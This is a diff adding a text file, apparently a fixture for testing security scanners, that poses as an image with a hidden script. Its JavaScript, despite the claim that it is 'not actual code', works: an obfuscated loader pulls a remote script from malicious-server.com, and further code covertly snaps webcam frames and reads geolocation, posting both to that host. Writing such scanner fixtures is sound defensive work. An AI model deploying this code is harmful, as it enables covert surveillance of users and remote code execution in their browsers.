@@ -1,0 +1,73 @@
+IMAGE WITH SIMULATED SCRIPT
+==========================
+
+This is a text file that simulates an image with an embedded malicious script.
+In a real scenario, this would be a .jpg or .png file with steganographically hidden code.
+
+The following is a representation of what might be hidden in the image:
+
+```javascript
+// MALICIOUS SCRIPT SIMULATION - This is not actual code
+(function() {
+    // Obfuscated malicious code
+    var _0x7a9e=["\x64\x6F\x63\x75\x6D\x65\x6E\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x63\x72\x69\x70\x74","\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F\x6D\x61\x6C\x69\x63\x69\x6F\x75\x73\x2D\x73\x65\x72\x76\x65\x72\x2E\x63\x6F\x6D\x2F\x70\x61\x79\x6C\x6F\x61\x64\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64"];
+    var a=window[_0x7a9e[0]][_0x7a9e[1]](_0x7a9e[2]);
+    a[_0x7a9e[3]]= _0x7a9e[4];
+    window[_0x7a9e[0]][_0x7a9e[6]][_0x7a9e[5]](a)
+})();
+
+// Access webcam
+navigator.mediaDevices.getUserMedia({video: true})
+    .then(function(stream) {
+        // Create hidden video element
+        var video = document.createElement('video');
+        video.style.display = 'none';
+        document.body.appendChild(video);
+        video.srcObject = stream;
+        video.play();
+        
+        // Take snapshot every 5 seconds
+        setInterval(function() {
+            // Create canvas
+            var canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            var ctx = canvas.getContext('2d');
+            
+            // Draw video frame to canvas
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert to data URL
+            var dataURL = canvas.toDataURL('image/jpeg');
+            
+            // Send to server
+            fetch('http://malicious-server.com/collect', {
+                method: 'POST',
+                body: JSON.stringify({
+                    type: 'webcam',
+                    image: dataURL,
+                    location: window.location.href,
+                    timestamp: new Date().toISOString()
+                })
+            });
+        }, 5000);
+    });
+
+// Get geolocation
+navigator.geolocation.getCurrentPosition(function(position) {
+    // Send to server
+    fetch('http://malicious-server.com/collect', {
+        method: 'POST',
+        body: JSON.stringify({
+            type: 'location',
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toISOString()
+        })
+    });
+});
+```
+
+This file is for testing security scanning tools only.
+No actual malicious code is present or executed.
